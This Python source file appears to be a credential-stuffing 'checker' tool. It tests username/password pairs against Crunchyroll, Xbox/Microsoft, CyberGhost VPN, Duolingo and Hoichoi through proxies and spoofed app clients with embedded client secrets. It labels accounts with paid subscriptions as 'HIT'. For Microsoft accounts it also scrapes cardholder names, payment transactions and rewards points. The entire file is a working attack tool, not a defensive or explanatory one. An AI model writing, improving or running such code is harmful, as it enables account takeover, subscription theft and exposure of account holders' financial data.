import requests
import uuid
import re
import random
import json
import time


def build_proxy_dict(proxy):
    if not proxy:
        return {}
    p = proxy.strip()
    if p.startswith("socks5://") or p.startswith("socks4://"):
        return {"http": p, "https": p}
    if p.startswith("http://") or p.startswith("https://"):
        return {"http": p, "https": p}
    parts = p.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        url = f"http://{user}:{pwd}@{host}:{port}"
        return {"http": url, "https": url}
    return {"http": f"http://{p}", "https": f"http://{p}"}


def generate_guid():
    return str(uuid.uuid4())


def generate_random_hex(length):
    return ''.join(random.choice('0123456789abcdef') for _ in range(length))


def generate_random_machine_name():
    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    digits = '0123456789'
    pick_c = lambda: random.choice(chars)
    pick_d = lambda: random.choice(digits)
    return f"{pick_c()}{pick_c()}-{pick_c()}{pick_d()}{pick_d()}{pick_d()}{pick_c()}"


SUPPORTED_CHECKERS = {
    "crunchyroll": "Crunchyroll",
    "xbox": "Xbox Game Pass",
    "cyberghost": "CyberGhost VPN",
    "duolingo": "Duolingo",
    "hoichoi": "Hoichoi",
}


def check_crunchyroll(user, password, proxy=None):
    url = "https://beta-api.crunchyroll.com/auth/v1/token"
    data = {
        "grant_type": "password",
        "username": user,
        "password": password,
        "scope": "offline_access",
        "client_id": "ajcylfwdtjjtq7qpgks3",
        "client_secret": "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_",
        "device_type": "SamsungTV",
        "device_id": generate_guid(),
        "device_name": "Goku"
    }
    headers = {
        "host": "beta-api.crunchyroll.com",
        "x-datadog-sampling-priority": "0",
        "content-type": "application/x-www-form-urlencoded",
        "accept-encoding": "gzip",
        "user-agent": "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0"
    }
    proxies_dict = build_proxy_dict(proxy)

    try:
        resp = requests.post(url, data=data, headers=headers, proxies=proxies_dict, timeout=25)
    except Exception:
        raise Exception("network_error")

    if resp.status_code in (429, 503):
        raise Exception("rate_limited")

    try:
        body = resp.json() if "application/json" in resp.headers.get("content-type", "") else {}
    except Exception:
        body = {}

    if isinstance(body, str):
        if "rate limit" in body.lower() or "rate limited" in body.lower():
            raise Exception("rate_limited")
        if "cloudflare" in body.lower() or "blocked" in body.lower():
            raise Exception("rate_limited")
        return {"status": "FAIL", "capture": {}}

    if body.get("error"):
        if body["error"] == "invalid_grant":
            return {"status": "FAIL", "capture": {}}
        if body["error"] == "auth.obtain_access_token.force_password_reset":
            return {"status": "CUSTOM", "capture": {"note": "Password reset required"}}
        if body["error"] == "too_many_requests":
            raise Exception("rate_limited")
        return {"status": "FAIL", "capture": {}}

    if "access_token" not in body:
        return {"status": "FAIL", "capture": {}}

    token = body["access_token"]
    profile_id = body.get("profile_id", "")
    capture = _get_crunchyroll_details(token, profile_id, proxy)

    if capture.get("subscription") == "true" or (capture.get("plan") and capture["plan"] not in ("Free", "N/A")):
        return {"status": "HIT", "capture": capture}
    return {"status": "FREE", "capture": capture}


def _get_crunchyroll_details(token, profile_id, proxy=None):
    auth_headers = {"User-Agent": "Crunchyroll/3.48.2 Android/9 okhttp/4.12.0", "Authorization": f"Bearer {token}"}
    proxies_dict = build_proxy_dict(proxy)
    capture = {"plan": "N/A", "country": "N/A", "expiry": "N/A", "emailVerified": "N/A", "subscription": "N/A"}

    try:
        me = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=auth_headers, proxies=proxies_dict, timeout=15).json()
        capture["emailVerified"] = str(me.get("email_verified", "N/A"))
        external_id = me.get("external_id", "")

        products = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products", headers=auth_headers, proxies=proxies_dict, timeout=15)
        pt = products.text
        sku_m = re.search(r'"sku":"([^"]+)"', pt)
        if sku_m:
            capture["plan"] = sku_m.group(1)
        sub_m = re.search(r'"is_subscribable":\s*(true|false)', pt)
        if sub_m:
            capture["subscription"] = sub_m.group(1)

        benefits = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits", headers=auth_headers, proxies=proxies_dict, timeout=15)
        bt = benefits.text
        cm = re.search(r'"subscription_country":"([^"]+)"', bt)
        if cm:
            capture["country"] = cm.group(1)
        conc = re.search(r'"benefit":"concurrent_([^"]+)"', bt)
        if conc:
            v = conc.group(1)
            if "4" in v:
                capture["plan"] = "MEGA FAN"
            elif "1" in v:
                capture["plan"] = "FAN"
            elif "6" in v:
                capture["plan"] = "ULTIMATE FAN"
            else:
                capture["plan"] = v

        subs = requests.get(f"https://beta-api.crunchyroll.com/subs/v4/accounts/{profile_id}/subscriptions", headers=auth_headers, proxies=proxies_dict, timeout=15)
        rm = re.search(r'"nextRenewalDate":"([^T]+)', subs.text)
        if rm:
            capture["expiry"] = rm.group(1)
    except Exception:
        pass
    return capture


def check_xbox(user, password, proxy=None):
    proxies_dict = build_proxy_dict(proxy)

    login_url = (
        "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2"
        "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
        "&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
        "&display=touch&username=" + requests.utils.quote(user) +
        "&contextid=2CCDB02DC526CA71&bk=1665024852"
        "&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"
    )

    login_body = (
        "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
        "&PPFT=-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
        "&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
        "&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"
        f"&login={requests.utils.quote(user)}&loginfmt={requests.utils.quote(user)}"
        f"&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={requests.utils.quote(password)}"
    )

    login_headers = {
        "Host": "login.live.com",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Origin": "https://login.live.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        resp = requests.post(login_url, data=login_body, headers=login_headers,
                             proxies=proxies_dict, timeout=20, allow_redirects=True)
    except Exception:
        raise Exception("network_error")

    if resp.status_code in (429, 503):
        raise Exception("rate_limited")

    response_text = resp.text or ""
    cookies = resp.cookies
    cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])

    if ("Your account or password is incorrect" in response_text or
            "That Microsoft account doesn't exist" in response_text or
            "Sign in to your Microsoft account" in response_text):
        return {"status": "FAIL", "capture": {}}

    if ",AC:null,urlFedConvertRename" in response_text:
        raise Exception("rate_limited")

    if "timed out" in response_text:
        return {"status": "FAIL", "capture": {}}

    if ("account.live.com/recover?mkt" in response_text or
            "recover?mkt" in response_text or
            "account.live.com/identity/confirm?mkt" in response_text or
            "Email/Confirm?mkt" in response_text):
        return {"status": "2FA", "capture": {"note": "2FA Required"}}

    if "/cancel?mkt=" in response_text or "/Abuse?mkt=" in response_text:
        return {"status": "CUSTOM", "capture": {"note": "Account locked or abused"}}

    is_success = ("ANON" in cookie_str and "WLSSC" in cookie_str) or \
                 "https://login.live.com/oauth20_desktop.srf?" in resp.url

    if not is_success:
        return {"status": "FAIL", "capture": {}}

    capture = {}
    session = requests.Session()
    session.cookies.update(cookies)
    if proxy:
        session.proxies = proxies_dict

    try:
        token_resp = session.get(
            "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A"
            "&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
            "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
            "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none",
            headers={
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            },
            timeout=20,
            allow_redirects=True
        )

        token_match = re.search(r"access_token=([^&]+)", token_resp.url)
        if not token_match:
            return {"status": "FREE", "capture": capture}
        token = requests.utils.unquote(token_match.group(1))

        auth_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
            "Accept": "application/json",
            "Authorization": f'MSADELEGATE1.0="{token}"',
            "Content-Type": "application/json",
            "Host": "paymentinstruments.mp.microsoft.com",
            "Origin": "https://account.microsoft.com",
            "Referer": "https://account.microsoft.com/",
        }

        payment_resp = session.get(
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
            headers=auth_headers, timeout=20
        )
        payment_src = payment_resp.text or ""

        name_m = re.search(r'accountHolderName":"([^"]+)"', payment_src)
        if name_m:
            capture["name"] = name_m.group(1)

        card_m = re.search(r'paymentMethodFamily":"credit_card","display":\{"name":"([^"]+)"', payment_src)
        if card_m:
            capture["cardHolder"] = card_m.group(1)

        if not capture.get("cardHolder") and not capture.get("name"):
            capture["name"] = capture.get("name", "N/A")

        txn_resp = session.get(
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
            headers=auth_headers, timeout=20
        )
        txn_src = txn_resp.text or ""

        country_m = re.search(r'country":"([^"]+)"\}', txn_src)
        if country_m:
            capture["country"] = country_m.group(1)

        title_m = re.search(r'"title":"([^"]+)"', txn_src)
        if title_m:
            capture["item"] = title_m.group(1)

        desc_m = re.search(r'"description":"([^"]+)"', txn_src)
        if desc_m:
            capture["description"] = desc_m.group(1)

        amount_m = re.search(r'"totalAmount":([^,]+)', txn_src)
        if amount_m:
            capture["totalAmount"] = amount_m.group(1)

        currency_m = re.search(r'"currency":"([^"]+)"', txn_src)
        if currency_m:
            capture["totalAmount"] = f"{capture.get('totalAmount', '0')} {currency_m.group(1)}"

        auto_m = re.search(r'"autoRenew":(\w+)', txn_src)
        if auto_m:
            capture["autoRenew"] = auto_m.group(1)

        billing_m = re.search(r'"nextRenewalDate":"([^T]+)', txn_src)
        if billing_m:
            capture["nextBilling"] = billing_m.group(1)

        try:
            rewards_resp = session.get("https://rewards.bing.com/",
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"},
                timeout=20)
            points_m = re.search(r',"availablePoints":(\d+)', rewards_resp.text or "")
            if points_m:
                capture["points"] = points_m.group(1)
        except Exception:
            pass

        is_game_pass = ("Xbox Game Pass Ultimate" in capture.get("item", "") or
                        "Xbox Game Pass Ultimate" in capture.get("description", ""))

        if is_game_pass:
            billing_year = int(capture.get("nextBilling", "0000").split("-")[0]) if capture.get("nextBilling") else 0
            if billing_year >= 2026:
                return {"status": "HIT", "capture": capture}
            return {"status": "FREE", "capture": capture}

        if capture.get("cardHolder") or capture.get("name"):
            return {"status": "CUSTOM", "capture": capture}

        return {"status": "FREE", "capture": capture}
    except Exception:
        return {"status": "FREE", "capture": capture}


def check_cyberghost(user, password, proxy=None):
    machine_id = generate_random_hex(32)
    machine_name = generate_random_machine_name()

    proxies_dict = build_proxy_dict(proxy)

    login_url = f"https://api.cyberghostvpn.com/cg/oauth/access_token?os=android&cid={machine_id}&osver=28&partnersId=1&version=8.32.0.3590&deviceType=unknown&lng=es&region="

    login_body = {
        "x_auth_machineid": machine_id,
        "x_auth_machinename": machine_name,
        "x_auth_password": password,
        "x_auth_username": user,
        "x_auth_mode": "client_auth",
    }

    login_headers = {
        "Accept-Encoding": "gzip",
        "Authorization": 'OAuth oauth_version="1.0", oauth_signature_method="PLAINTEXT", oauth_consumer_key="2321624eecd93aacdd70203266f01b92887745", oauth_signature="c6c972fbbaf24380994a31242e8b246c1775afe%26"',
        "Connection": "Keep-Alive",
        "Content-Type": "application/json",
        "Host": "api.cyberghostvpn.com",
        "User-Agent": "CG-And/8.32.0.3590 (Android 9; SM-N975F/samsung-user 9.0.0 20171130.276299 release-keys/4.19.71+)",
        "X-APP-KEY": "2321624eecd93aacdd70203266f01b92887745",
        "X-MACHINE-ID": machine_id,
        "X-MACHINE-NAME": machine_name,
    }

    try:
        login_resp = requests.post(login_url, data=json.dumps(login_body), headers=login_headers, proxies=proxies_dict, timeout=15)
    except Exception:
        raise Exception("network_error")

    if login_resp.status_code == 429:
        raise Exception("rate_limited")

    login_data = login_resp.text or ""

    if "USER NOT FOUND OR WRONG PASSWORD!" in login_data:
        return {"status": "FAIL", "capture": {}}

    if "MAXIMUM ACTIVATIONS REACHED - RESET REQUIRED" in login_data:
        return {"status": "CUSTOM", "capture": {"note": "Max activations reached"}}

    if "oauth_token" not in login_data:
        return {"status": "FAIL", "capture": {}}

    token_match = re.search(r'oauth_token=([^&]+)', login_data)
    secret_match = re.search(r'oauth_token_secret=(.+?)(?:&|$)', login_data)

    if not token_match or not secret_match:
        return {"status": "FAIL", "capture": {}}

    oauth_token = token_match.group(1)
    oauth_secret = secret_match.group(1)

    info_url = f"https://api.cyberghostvpn.com/cg/users/me?os=android&cid={machine_id}&osver=28&partnersId=1&version=8.32.0.3590&deviceType=unknown&lng=es&region&flags=18"

    info_headers = {
        "Accept": "application/json; charset=UTF-8",
        "Accept-Encoding": "gzip",
        "Authorization": f'OAuth oauth_version="1.0", oauth_signature_method="PLAINTEXT", oauth_consumer_key="2321624eecd93aacdd70203266f01b92887745", oauth_signature="c6c972fbbaf24380994a31242e8b246c1775afe%26{oauth_secret}", oauth_token="{oauth_token}"',
        "Connection": "Keep-Alive",
        "Host": "api.cyberghostvpn.com",
        "User-Agent": "CG-And/8.32.0.3590 (Android 9; SM-N975F/samsung-user 9.0.0 20171130.276299 release-keys/4.19.71+)",
        "X-APP-KEY": "2321624eecd93aacdd70203266f01b92887745",
        "X-MACHINE-ID": machine_id,
        "X-MACHINE-NAME": machine_name,
    }

    try:
        info_resp = requests.get(info_url, headers=info_headers, proxies=proxies_dict, timeout=15)
    except Exception:
        raise Exception("network_error")

    if info_resp.status_code == 429:
        raise Exception("rate_limited")

    info_data = info_resp.text or ""
    capture = {}

    days_match = re.search(r'"days_left":(\d+)', info_data)
    if days_match:
        capture["daysLeft"] = days_match.group(1)

    trial_match = re.search(r'"hasPaidTrial":(true|false)', info_data)
    if trial_match:
        capture["onTrial"] = trial_match.group(1)

    max_dev_match = re.search(r'"max_devices":(\d+)', info_data)
    active_dev_match = re.search(r'"activateddevices":"(\d+)"', info_data)
    if active_dev_match and max_dev_match:
        capture["devicesInUse"] = f"{active_dev_match.group(1)}/{max_dev_match.group(1)}"
    elif max_dev_match:
        capture["devicesInUse"] = f"0/{max_dev_match.group(1)}"

    plan_match = re.search(r'"internal_name":"([^"]+)"', info_data)
    if plan_match:
        capture["plan"] = plan_match.group(1)

    recurring_match = re.search(r'"recurring":(\d)', info_data)
    capture["autoRenew"] = "True" if recurring_match and recurring_match.group(1) != "0" else "False"

    start_match = re.search(r'"startdate":"([^"]+)"', info_data)
    if start_match:
        capture["startDate"] = start_match.group(1).split(" ")[0]

    end_match = re.search(r'"enddate":"([^"]+)"', info_data)
    if end_match:
        capture["endDate"] = end_match.group(1).split(" ")[0]

    is_paid = '"plan_type":"paid"' in info_data
    days_left = int(capture.get("daysLeft", "0"))

    if is_paid and days_left > 0:
        return {"status": "HIT", "capture": capture}

    return {"status": "FREE", "capture": capture}


def check_duolingo(user, password, proxy=None):
    uid = generate_guid()

    proxies_dict = build_proxy_dict(proxy)

    login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"

    login_body = {
        "distinctId": uid,
        "identifier": user,
        "password": password,
    }

    login_headers = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json",
        "Host": "android-api.duolingo.cn",
        "User-Agent": "Duodroid/5.141.7 Dalvik/2.1.0 (Linux; U; Android 9; SM-G935F Build/PI)",
        "X-Amzn-Trace-Id": "",
    }

    try:
        login_resp = requests.post(login_url, data=json.dumps(login_body), headers=login_headers, proxies=proxies_dict, timeout=15)
    except Exception:
        raise Exception("network_error")

    if login_resp.status_code == 429:
        raise Exception("rate_limited")

    try:
        login_data = login_resp.json() if login_resp.text and login_resp.text.strip() != '{}' else {}
    except Exception:
        login_data = {}

    if not login_data.get("id"):
        return {"status": "FAIL", "capture": {}}

    user_id = login_data["id"]

    cookies = login_resp.cookies
    wuuid = ""
    for c in login_resp.headers.get("set-cookie", "").split(","):
        m = re.search(r'wuuid=([^;]+)', c)
        if m:
            wuuid = m.group(1)
            break

    info_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=username,totalXp,streak,hasPlus,id"

    info_headers = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjo4MjMxMjAwNjV9.nFHiqpAnBpaG64JOHkaWdefa46fWuhWBCcKisOL2CGE",
        "Connection": "Keep-Alive",
        "Host": "android-api.duolingo.cn",
        "User-Agent": "Duodroid/5.141.7 Dalvik/2.1.0 (Linux; U; Android 9; SM-G935F Build/PI)",
        "X-Amzn-Trace-Id": f"User={user_id}",
    }
    if wuuid:
        info_headers["Cookie"] = f"wuuid={wuuid}"

    try:
        info_resp = requests.get(info_url, headers=info_headers, proxies=proxies_dict, timeout=15)
    except Exception:
        raise Exception("network_error")

    if info_resp.status_code == 429:
        raise Exception("rate_limited")

    try:
        info_data = info_resp.json() if info_resp.text else {}
    except Exception:
        info_data = {}

    capture = {}
    if info_data.get("username"):
        capture["username"] = str(info_data["username"])
    if info_data.get("totalXp") is not None:
        capture["totalXp"] = str(info_data["totalXp"])
    if info_data.get("streak") is not None:
        capture["streak"] = str(info_data["streak"])

    has_plus = info_data.get("hasPlus") is True

    if has_plus:
        return {"status": "HIT", "capture": capture}

    return {"status": "FREE", "capture": capture}


def check_hoichoi(user, password, proxy=None):
    proxies_dict = build_proxy_dict(proxy)

    login_url = "https://prod-api.hoichoi.dev/core/api/v1/auth/signin/email"
    login_body = {
        "email": user,
        "password": password,
        "deviceId": f"browser-{generate_guid()}",
    }

    login_headers = {
        "Host": "prod-api.hoichoi.dev",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Origin": "https://www.hoichoi.tv",
        "Referer": "https://www.hoichoi.tv/",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua-mobile": "?1",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
    }

    try:
        login_resp = requests.post(login_url, data=json.dumps(login_body), headers=login_headers, proxies=proxies_dict, timeout=15)
    except Exception:
        raise Exception("network_error")

    if login_resp.status_code == 429:
        raise Exception("rate_limited")

    try:
        login_data = login_resp.json() if login_resp.text else {}
    except Exception:
        login_data = {}

    login_str = login_resp.text or ""

    if "Auth invalid credentials" in login_str or not login_data.get("sAccessToken"):
        return {"status": "FAIL", "capture": {}}

    token = login_data["sAccessToken"]

    sub_url = "https://prod-api.hoichoi.dev/subscription/ott/api/user/subscription"
    sub_headers = {
        "Host": "prod-api.hoichoi.dev",
        "Authorization": f"Bearer {token}",
        "Accept": "*/*",
        "Origin": "https://www.hoichoi.tv",
        "Referer": "https://www.hoichoi.tv/",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua-mobile": "?1",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
    }

    try:
        sub_resp = requests.get(sub_url, headers=sub_headers, proxies=proxies_dict, timeout=15)
    except Exception:
        raise Exception("network_error")

    if sub_resp.status_code == 429:
        raise Exception("rate_limited")

    sub_str = sub_resp.text or ""
    capture = {}

    status_match = re.search(r'"subscription_status":"([^"]+)"', sub_str)
    if status_match:
        capture["subscription"] = status_match.group(1)

    country_match = re.search(r'"country_name":"([^"]+)"', sub_str)
    if country_match:
        capture["country"] = country_match.group(1)

    devices_match = re.search(r'"max_connected_devices":(\d+)', sub_str)
    if devices_match:
        capture["maxDevices"] = devices_match.group(1)

    renew_match = re.search(r'"auto_renewal":(true|false)', sub_str)
    if renew_match:
        capture["autoRenewal"] = renew_match.group(1)

    plan_match = re.search(r'"title":"([^"]+)"', sub_str)
    if plan_match:
        capture["plan"] = plan_match.group(1)

    billing_match = re.search(r'"billing_frequency":"([^"]+)"', sub_str)
    if billing_match:
        capture["billingPeriod"] = billing_match.group(1)

    expiry_match = re.search(r'"subscription_end_date":"([^T]+)', sub_str)
    if expiry_match:
        capture["expiryDate"] = expiry_match.group(1)
        try:
            from datetime import datetime
            end_date = datetime.strptime(expiry_match.group(1), "%Y-%m-%d")
            now = datetime.now()
            diff_days = (end_date - now).days
            capture["daysLeft"] = str(max(diff_days, 0))
        except Exception:
            capture["daysLeft"] = "0"

    if '"subscription_status":"ACTIVE"' in sub_str:
        return {"status": "HIT", "capture": capture}

    return {"status": "FREE", "capture": capture}


CHECKER_MAP = {
    "crunchyroll": check_crunchyroll,
    "xbox": check_xbox,
    "cyberghost": check_cyberghost,
    "duolingo": check_duolingo,
    "hoichoi": check_hoichoi,
}


def run_check(checker_type, user, password, proxy=None):
    fn = CHECKER_MAP.get(checker_type)
    if not fn:
        return {"status": "error", "message": f"Unknown checker: {checker_type}"}

    last_err = None
    for attempt in range(2):
        try:
            return fn(user, password, proxy)
        except Exception as e:
            last_err = str(e)
            if "rate_limited" in last_err:
                return {"status": "error", "message": "Rate limited. Try again later or add a proxy in Settings."}
            if "network_error" in last_err:
                if attempt == 0 and proxy:
                    proxy = None
                    continue
                if attempt == 0 and not proxy:
                    continue
                return {"status": "error", "message": "Connection failed. Add a proxy in Settings to improve reliability."}
            return {"status": "error", "message": f"Check failed: {last_err[:100]}"}

    return {"status": "error", "message": f"Check failed after retries: {(last_err or 'unknown')[:100]}"}
